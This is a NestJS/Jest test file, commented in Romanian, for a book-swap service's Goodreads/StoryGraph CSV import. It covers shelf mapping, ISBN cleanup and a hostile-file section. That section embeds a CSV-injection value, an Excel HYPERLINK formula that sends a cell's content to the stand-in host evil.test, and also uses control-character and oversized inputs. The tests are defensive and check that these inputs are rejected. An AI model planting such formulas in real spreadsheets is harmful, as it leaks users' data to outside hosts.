import { Test, TestingModule } from '@nestjs/testing';
import { BooksService } from './books.service';
import { PrismaService } from '../prisma/prisma.service';
import { StorageService } from '../storage/storage.service';
import { WishlistService } from '../wishlist/wishlist.service';
import { FollowService } from '../follow/follow.service';
import { NotificationsService } from '../notifications/notifications.service';
import { BookLookupService } from './book-lookup.service';
import { ListingScoreService } from './listing-score.service';
import { SavedSearchesService } from '../saved-searches/saved-searches.service';
import { ReviewsService } from '../reviews/reviews.service';
import { StoresService } from '../stores/stores.service';
import { CatalogMatchService } from './catalog-match.service';

/**
 * Importul CSV din „Cărțile mele" citește rafturile Goodreads/StoryGraph.
 *
 * Bugul acoperit aici: până acum ORICE rând devenea anunț, deci un export
 * Goodreads întreg - inclusiv titlurile „to-read" sau doar puse la favorite -
 * ajungea disponibil la schimb.
 */
describe('BooksService - import CSV cu rafturi (Goodreads/StoryGraph)', () => {
  let service: BooksService;
  let prisma: {
    user: { findUnique: jest.Mock; update: jest.Mock };
    userBook: Record<string, jest.Mock>;
    book: Record<string, jest.Mock>;
    bookshelfEntry: Record<string, jest.Mock>;
    wishlistItem: Record<string, jest.Mock>;
    searchLog: Record<string, jest.Mock>;
  };

  let lookup: Record<string, jest.Mock>;
  let catalogMatch: { findByTitle: jest.Mock };
  let follow: { notifyFollowersOfNewBook: jest.Mock };

  const csv = (body: string) => Buffer.from(body, 'utf-8');

  beforeEach(async () => {
    catalogMatch = { findByTitle: jest.fn().mockResolvedValue(null) };
    follow = { notifyFollowersOfNewBook: jest.fn().mockResolvedValue(undefined) };
    lookup = {
      lookupByIsbn: jest.fn().mockResolvedValue(null),
      lookupPrice: jest.fn().mockResolvedValue(null),
      lookupCoverByTitle: jest.fn().mockResolvedValue(null),
    };
    prisma = {
      user: {
        findUnique: jest.fn().mockResolvedValue({ isStore: false }),
        update: jest.fn().mockResolvedValue({}),
      },
      userBook: {
        findFirst: jest.fn().mockResolvedValue(null),
        findUnique: jest.fn().mockResolvedValue(null),
        create: jest
          .fn()
          .mockResolvedValue({ id: 'ub-1', book: { title: 'Dune' } }),
        update: jest.fn().mockResolvedValue({}),
        updateMany: jest.fn().mockResolvedValue({ count: 2 }),
      },
      book: {
        // Titlul e deja în catalog: calea fără ISBN îl refolosește, ca importul
        // să nu creeze un duplicat pentru fiecare rând.
        findFirst: jest.fn().mockResolvedValue({ id: 'book-1', title: 'Dune' }),
        findUnique: jest.fn().mockResolvedValue(null),
        create: jest
          .fn()
          .mockResolvedValue({ id: 'book-1', title: 'Dune' }),
      },
      bookshelfEntry: { upsert: jest.fn().mockResolvedValue({}) },
      wishlistItem: {
        findFirst: jest.fn().mockResolvedValue(null),
        create: jest.fn().mockResolvedValue({}),
      },
      searchLog: { create: jest.fn().mockResolvedValue(null) },
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        BooksService,
        { provide: PrismaService, useValue: prisma },
        { provide: StorageService, useValue: {} },
        { provide: WishlistService, useValue: { notifyWishlistedUsers: jest.fn().mockResolvedValue(undefined) } },
        { provide: FollowService, useValue: follow },
        { provide: ReviewsService, useValue: {} },
        { provide: NotificationsService, useValue: {} },
        { provide: BookLookupService, useValue: lookup },
        { provide: ListingScoreService, useValue: {} },
        { provide: SavedSearchesService, useValue: { notifyOnNewListing: jest.fn().mockResolvedValue(undefined) } },
        { provide: StoresService, useValue: {} },
        { provide: CatalogMatchService, useValue: catalogMatch },
      ],
    }).compile();

    service = module.get(BooksService);
  });

  it('„to-read" ajunge la „De citit" pe raft, nu la favorite si nu in piata', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('Title,Author,Exclusive Shelf\nDune,Herbert,to-read\n'),
    );

    expect(result.shelved).toEqual([{ title: 'Dune', status: 'WANT_TO_READ' }]);
    expect(result.favorited).toHaveLength(0);
    expect(result.created).toHaveLength(0);
    expect(prisma.userBook.create).not.toHaveBeenCalled();
    expect(prisma.wishlistItem.create).not.toHaveBeenCalled();
    expect(prisma.bookshelfEntry.upsert).toHaveBeenCalledWith(
      expect.objectContaining({
        create: expect.objectContaining({ status: 'WANT_TO_READ', owned: false }),
      }),
    );
  });

  it('„read" si „currently-reading" ajung pe raft, NEdeținute si fara anunt', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('Title,Exclusive Shelf\nDune,read\nDune,currently-reading\n'),
    );

    expect(result.shelved.map((s) => s.status)).toEqual([
      'FINISHED',
      'READING',
    ]);
    expect(result.created).toHaveLength(0);
    expect(prisma.userBook.create).not.toHaveBeenCalled();
    expect(prisma.bookshelfEntry.upsert).toHaveBeenCalledWith(
      expect.objectContaining({
        create: {
          userId: 'user-1',
          bookId: 'book-1',
          status: 'FINISHED',
          // „Am citit-o" nu inseamna „o am": la Detinute ajunge doar prin
          // gestul explicit al userului.
          owned: false,
        },
      }),
    );
  });

  it('titlul doar la „favorites" printre rafturile libere ramane doar la favorite', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('Title,Bookshelves\nDune,"sci-fi, favorites"\n'),
    );

    expect(result.favorited).toEqual([{ title: 'Dune' }]);
    expect(prisma.userBook.create).not.toHaveBeenCalled();
  });

  it('un rand de stoc (sku/qty/price) ramane anunt, oricare ar fi raftul', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('sku,title,qty,price,Exclusive Shelf\nA-1,Dune,2,30,to-read\n'),
    );

    // Nu ne intereseaza aici tot ciclul de creare (acoperit de addToLibrary),
    // ci doar ca randul a mers pe calea de anunt, nu pe raft.
    expect(result.favorited).toHaveLength(0);
    expect(result.shelved).toHaveLength(0);
    expect(prisma.userBook.create).toHaveBeenCalled();
  });

  it('un raft pe care nu-l intelegem („did-not-finish") se sare, nu devine anunt', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('Title,Read Status\nDune,did-not-finish\nSolaris,scoala\n'),
    );

    expect(result.skipped).toEqual([
      { title: 'Dune', shelf: 'did-not-finish' },
      { title: 'Solaris', shelf: 'scoala' },
    ]);
    expect(result.failed).toHaveLength(0);
    expect(prisma.userBook.create).not.toHaveBeenCalled();
    expect(prisma.bookshelfEntry.upsert).not.toHaveBeenCalled();
    expect(prisma.wishlistItem.create).not.toHaveBeenCalled();
  });

  it('un CSV fara coloane de raft se comporta exact ca inainte: anunturi', async () => {
    const result = await service.importListingsCsv(
      'user-1',
      csv('title,author\nDune,Herbert\n'),
    );

    expect(result.favorited).toHaveLength(0);
    expect(result.shelved).toHaveLength(0);
    expect(prisma.userBook.create).toHaveBeenCalled();
  });

  it('curata invelisul Excel al ISBN-ului Goodreads si ignora `=""`', async () => {
    prisma.book.findFirst.mockResolvedValue(null);
    prisma.book.findUnique.mockResolvedValue(null);

    await service.importListingsCsv(
      'user-1',
      csv(
        'Title,ISBN,Exclusive Shelf\n' +
          'Dune,"=""0143039954""",read\n' +
          'White Nights,"=""""",read\n',
      ),
    );

    // Primul rand: ISBN curatat de invelisul Excel, cautat ca atare.
    expect(prisma.book.findUnique).toHaveBeenCalledWith({
      where: { isbn: '0143039954' },
    });
    // Al doilea: `=""` nu e un ISBN, deci cautam pe titlu (prin potrivirea
    // indexata din catalog) si NU scriem un ISBN fals pe care s-ar dedubla
    // toate cartile fara ISBN.
    expect(catalogMatch.findByTitle).toHaveBeenCalledWith('White Nights', null);
    const created = prisma.book.create.mock.calls.map(
      (c) => c[0].data as Record<string, unknown>,
    );
    expect(created[0]).toMatchObject({ isbn: '0143039954', title: 'Dune' });
    expect(created[1].isbn).toBeUndefined();
  });

  it('nu cauta extern pentru randurile de raft (fara timeout pe sute de randuri)', async () => {
    prisma.book.findFirst.mockResolvedValue(null);
    prisma.book.findUnique.mockResolvedValue(null);

    await service.importListingsCsv(
      'user-1',
      csv('Title,Exclusive Shelf\nDune,read\n'),
    );

    expect(lookup.lookupByIsbn).not.toHaveBeenCalled();
    expect(lookup.lookupCoverByTitle).not.toHaveBeenCalled();
  });

  describe('fisier ostil', () => {
    beforeEach(() => {
      // Anuntul proaspat creat exista, deci syncStockRow trece si randul
      // ajunge in `created`.
      prisma.userBook.findUnique.mockResolvedValue({
        salePrice: null,
        permanentlyTransferred: false,
      });
      prisma.book.findFirst.mockResolvedValue(null);
    });

    it('nu trimite cate o notificare per rand; XP-ul se acorda o singura data', async () => {
      const result = await service.importListingsCsv(
        'user-1',
        csv('title,author\nDune,Herbert\nSolaris,Lem\nIdiotul,Dostoievski\n'),
      );

      expect(result.created).toHaveLength(3);
      // Fara `silent`, fiecare rand anunta followerii si vecinii din oras.
      expect(follow.notifyFollowersOfNewBook).not.toHaveBeenCalled();
      expect(prisma.user.update).toHaveBeenCalledTimes(1);
      expect(prisma.user.update).toHaveBeenCalledWith({
        where: { id: 'user-1' },
        data: { xp: { increment: 30 } },
      });
    });

    it('un „ISBN" care nu e ISBN (formula Excel) nu ajunge in catalog', async () => {
      const result = await service.importListingsCsv(
        'user-1',
        csv(
          'title,isbn\n' +
            'Dune,"=HYPERLINK(""https://evil.test/?""&A1,""x"")"\n' +
            ',1234567890\n',
        ),
      );

      // Randul cu titlu merge mai departe pe titlu, fara ISBN.
      expect(lookup.lookupByIsbn).not.toHaveBeenCalled();
      const created = prisma.book.create.mock.calls.map(
        (c) => c[0].data as Record<string, unknown>,
      );
      expect(created).toHaveLength(1);
      expect(created[0].isbn).toBeUndefined();
      // 1234567890 are cifra de control gresita, iar randul n-are titlu.
      expect(result.failed).toEqual([
        { title: '(fără titlu)', reason: 'ISBN invalid și niciun titlu' },
      ]);
    });

    it('taie titlul la plafonul formularului si scoate caracterele de control', async () => {
      const longTitle = `Dune\u202E${'A'.repeat(5000)}`;
      await service.importListingsCsv(
        'user-1',
        csv(
          `title,author,description\n"${longTitle}","Her\u0000bert",${'x'.repeat(1000)}\n`,
        ),
      );

      const book = prisma.book.create.mock.calls[0][0].data as {
        title: string;
        author: string;
      };
      expect(book.title).toHaveLength(300);
      expect(book.title.startsWith('DuneAAA')).toBe(true);
      expect(book.author).toBe('Herbert');
      const listing = prisma.userBook.create.mock.calls[0][0].data as {
        description: string;
      };
      expect(listing.description).toHaveLength(256);
    });

    it('respinge un sku absurd de lung in loc sa-l taie (s-ar ciocni cu altul)', async () => {
      const result = await service.importListingsCsv(
        'user-1',
        csv(`sku,title,qty\n${'S'.repeat(500)},Dune,1\n`),
      );

      expect(result.failed).toHaveLength(1);
      expect(result.failed[0].reason).toMatch(/SKU prea lung/);
      expect(prisma.userBook.create).not.toHaveBeenCalled();
    });
  });

  it('stergerea in masa atinge doar anunturile proprii, nesterse', async () => {
    const result = await service.deleteUserBooks('user-1', ['ub-1', 'ub-2']);

    expect(prisma.userBook.updateMany).toHaveBeenCalledWith({
      where: { id: { in: ['ub-1', 'ub-2'] }, userId: 'user-1', deletedAt: null },
      data: { deletedAt: expect.any(Date), availableForSwap: false },
    });
    expect(result).toEqual({ deleted: 2, requested: 2 });
  });
});
